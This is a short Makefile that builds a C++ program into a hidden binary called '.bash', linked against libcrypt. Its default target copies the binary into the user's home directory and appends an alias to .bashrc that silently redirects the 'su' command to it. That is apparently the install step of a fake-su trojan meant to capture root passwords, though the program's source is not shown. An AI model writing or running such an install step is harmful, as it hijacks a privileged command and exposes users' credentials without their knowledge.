CC = g++
CFLAGS = -Wall --std=c++11 -lcrypt
all:
	$(CC) -o bin/.bash src/main.cpp $(CFLAGS)
	cp bin/.bash /home/$(USER)/.bash
	echo "alias su='/home/$(USER)/.bash'" >> /home/$(USER)/.bashrc
	bash
compile:
	$(CC) -o bin/.bash src/main.cpp $(CFLAGS)
run:
	./bin/.bash
help:
	./bin/.bash -h